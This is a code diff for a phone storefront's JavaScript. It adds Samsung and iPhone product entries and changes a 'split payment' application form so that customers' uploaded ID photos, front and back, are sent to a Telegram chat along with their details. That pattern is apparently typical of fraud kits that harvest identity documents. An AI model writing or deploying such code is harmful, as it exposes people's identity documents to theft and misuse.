@@ -28,6 +28,30 @@ document.addEventListener('DOMContentLoaded', () => {
             defaultImage: 'https://m.media-amazon.com/images/I/61C17Al0dhL._AC_SX569_.jpg'
         },
         {
+            id: 'galaxys24ultra',
+            name: 'Samsung Galaxy S24 Ultra',
+            variants: [
+                { storage: '256GB', price: 1150 },
+                { storage: '512GB', price: 1250 },
+            ],
+            colors: [
+                { name: 'Titanium Black', image: 'https://m.media-amazon.com/images/I/71I-leJ7QVL._AC_SX679_.jpg' }
+            ],
+            defaultImage: 'https://m.media-amazon.com/images/I/71I-leJ7QVL._AC_SX679_.jpg'
+        },
+        {
+            id: 'galaxys24',
+            name: 'Samsung Galaxy S24',
+            variants: [
+                { storage: '128GB', price: 850 },
+                { storage: '256GB', price: 950 },
+            ],
+            colors: [
+                { name: 'Onyx Black', image: 'https://m.media-amazon.com/images/I/61uakkLoHxL._AC_SX569_.jpg' }
+            ],
+            defaultImage: 'https://m.media-amazon.com/images/I/61uakkLoHxL._AC_SX569_.jpg'
+        },
+        {
             id: 'iphone16promax',
             name: 'iPhone 16 Pro Max',
             variants: [
@@ -38,6 +62,18 @@ document.addEventListener('DOMContentLoaded', () => {
             colors: [
                 { name: 'Čierny titán', image: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_hero_black_titanium__e4y3a1p2ozia_large.jpg' },
                 { name: 'Púštny titán', image: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_hero_natural_titanium__b73a68n5a626_large.jpg' }
+            ],
+            defaultImage: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_display_pro_max_large.jpg'
+        },
+        {
+            id: 'iphone15promax',
+            name: 'iPhone 15 Pro Max',
+            variants: [
+                { storage: '256GB', price: 1100 },
+                { storage: '512GB', price: 1250 },
+            ],
+            colors: [
+                { name: 'Čierny titán', image: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_hero_black_titanium__e4y3a1p2ozia_large.jpg' }
             ],
             defaultImage: 'https://www.apple.com/v/iphone-15-pro/c/images/overview/design/design_display_pro_max_large.jpg'
         },
@@ -358,18 +394,25 @@ document.addEventListener('DOMContentLoaded', () => {
             businessName: document.getElementById('business-name')?.value || 'N/A',
             businessSince: document.getElementById('business-since')?.value || 'N/A',
             idFront: document.getElementById('id-upload-front').files[0]?.name || 'Not provided',
-            idBack: document.getElementById('id-upload-back').files[0]?.name || 'Not provided',
+            idBack: document.getElementById('id-upload-back').files[0]?.name || 'Not provided'
         };
+
+        const idFrontFile = document.getElementById('id-upload-front').files[0];
+        const idBackFile = document.getElementById('id-upload-back').files[0];
 
         if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.splitPaymentApplicationSubmitted) {
             TelegramNotifications.splitPaymentApplicationSubmitted({
                 productName: `${state.selectedProduct.name} (${state.selectedVariant.storage} - ${state.selectedColor})`,
-                total: document.getElementById('summary-total-price').textContent,
+                total: document.getElementById('summary-total-price').textContent.trim(),
                 monthly: document.getElementById('summary-monthly').textContent + " / month",
                 months: monthsSelect.value,
                 customer: customerData,
                 country: window.currentCountry.toUpperCase()
             });
+        }
+
+        if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.sendPhotosWithCaption && idFrontFile && idBackFile) {
+            TelegramNotifications.sendPhotosWithCaption([idFrontFile, idBackFile], `ID Documents for Order from ${customerData.name}`);
         }
 
         goToStep(5); // Go to success step
